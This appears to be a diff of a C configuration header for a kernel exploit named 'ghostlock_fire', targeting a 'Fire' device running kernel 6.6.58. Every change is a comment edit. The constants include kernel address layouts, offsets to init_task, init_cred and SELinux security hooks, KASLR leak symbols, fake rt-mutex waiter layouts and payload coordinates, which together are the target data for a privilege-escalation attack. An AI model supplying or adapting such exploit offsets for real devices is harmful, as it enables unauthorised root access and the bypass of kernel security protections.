@@ -3,7 +3,7 @@
 
 #define BUILD_VARIANT_LABEL "ghostlock_fire"
 
-/* Kernel address layout. */
+/* Kernel address layout; Fire runtime/boot mapping, not a generic default. */
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
 #define MTK_VADDR_BASE 0xffffffc000000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
@@ -15,7 +15,7 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* Symbol offsets. */
+/* Global-symbol offsets: Fire vmlinux/kallsyms source. */
 #define INIT_TASK_OFF 0x0213e280ULL
 #define INIT_CRED_OFF 0x021505f8ULL
 #define ROOT_TASK_GROUP_OFF 0x02331580ULL
@@ -23,7 +23,7 @@
 #define SELINUX_BLOB_SIZES_OFF 0x01661f08ULL
 #define SECURITY_HOOK_HEADS_OFF 0x016617d0ULL
 
-/* KASLR leak symbols. */
+/* KASLR leak symbols: Fire vmlinux/kallsyms source. */
 #define SLIDE_NFULNL_LOGGER_OFF 0x02132258ULL
 #define SLIDE_LOGGERS_0_1_OFF 0x021321a0ULL
 #define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02393e58ULL
@@ -45,7 +45,7 @@
 
 #define PSELECT_WAITER_WORD_SHIFT -2
 
-/* Fake waiter and task layouts. */
+/* BTF-derived struct layouts for Fire 6.6.58. */
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
 #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
@@ -93,6 +93,7 @@
 #define STRUCT_SLAB_CACHE_OFF 0x08
 #define STRUCT_PAGE_TYPE_OFF 0x30
 
+/* Payload-local coordinates; not kernel RVAs and not BTF fields. */
 #define LOCK_OFF 0x0E80
 #define W0_OFF 0x1180
 #define FOPS_OFF 0x0F80
